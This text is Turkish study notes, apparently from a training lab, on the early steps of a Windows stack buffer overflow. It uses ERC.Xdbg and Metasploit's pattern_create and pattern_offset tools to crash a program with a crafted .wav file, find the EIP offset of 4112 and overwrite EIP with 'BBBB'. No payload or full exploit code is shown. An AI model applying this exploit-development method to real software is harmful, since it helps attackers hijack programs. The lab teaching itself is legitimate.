...
[Bu](https://github.com/Andy53/ERC.Xdbg/releases) adrese giderek 32-bit arşiv dosyasını indir.

Arşivden çıkan dosyaları aşağıda yolu verilen klasöre kopyala:
...
```pwsh
Command: ERC --Config SetWorkingDirectory C:\Users\htb-student\
```
...
```shell
my@attack:~$ /opt/metasploit/tools/exploit/pattern_create.rb -l 5000
```
...
!!! danger
    ...
    Debugger attach edilmiş olmalıdır.

```pwsh
Command: ERC --Pattern create 5000
```

## Code

```python title="program.py" linenums="1" hl_lines="5 16-17"
import sys
...
```pwsh
PS C:\Users\htb-student> python .\program.py eip_pattern
```
...
* Encode
* C:\Users\htb-student\pattern.wav
* Open

Program crash verdi:

```text title="Paused"
First chance exception 31684630 (C0000005, EXCEPTION_ACCESS_VIOLATION)!
```

EIP register değerini görüntüleyelim (31684630, 1hF0):
...
EDX : 00001388
EBP : 67463567
ESP : 0014F974     ""
ESI : 46386746
EDI : 37674636
EIP : 31684630
EFLAGS : 00210216
...
```shell
my@attack:~$ /opt/metasploit/tools/exploit/pattern_offset.rb -q 31684630
```
...
EIP register üzerinde Modify value seçeneğini kullan:
...
Offset değerini hesaplamak için ASCII formatını kullan:
...
```pwsh
Command: ERC --Pattern offset 1hF0
```

```output title="Output"
Value found reversed at postiont 4112 in pattern.
```

## Creating Another Sound File

```pwsh
PS C:\Users\htb-student> python .\program.py eip_control 4112
```
...
* Encode
* C:\Users\htb-student\control.wav
* Open
...
EIP register değerini görüntüleyelim (42424242, BBBB):
